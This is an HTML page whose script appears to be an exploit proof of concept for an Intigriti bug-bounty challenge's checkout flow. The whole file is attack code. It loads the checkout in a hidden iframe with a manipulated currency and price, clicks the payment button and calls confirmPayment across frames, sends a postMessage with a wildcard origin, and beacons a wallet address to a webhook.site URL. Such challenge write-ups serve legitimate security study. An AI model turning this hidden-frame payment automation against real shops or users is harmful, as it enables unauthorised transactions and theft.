<!DOCTYPE html>
<html>
<body>
<script>
const ADDRESS = "114a580aae95817f9bf8d3704eb6e69417";
const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";

const checkout = document.createElement("iframe");
checkout.style.display = "none";
checkout.src =
  "https://challenge-0126.intigriti.io/checkout.html" +
  "?currency=1337COIN&price=1";

document.body.appendChild(checkout);

// Wait for checkout + wallets
setTimeout(() => {
  // Trigger Proceed to Payment
  checkout.contentWindow.document
    .getElementById("proceedBtn")
    .click();
}, 5000);

// Wait for payment-gateway iframe to load
setTimeout(() => {
  const paymentFrame =
    checkout.contentWindow.document.getElementById("paymentIframe");

  // Send init message (real flow)
  paymentFrame.contentWindow.postMessage({
    type: "init",
    currency: "1337COIN",
    amount: 1,
    price: 1
  }, "*");
}, 8000);

// Trigger confirmPayment inside gateway
setTimeout(() => {
  const paymentFrame =
    checkout.contentWindow.document.getElementById("paymentIframe");

  paymentFrame.contentWindow.confirmPayment();

  // Beacon
  new Image().src =
    WEBHOOK + "?step=confirm_clicked&addr=" + ADDRESS;

}, 11000);
</script>
</body>
</html>
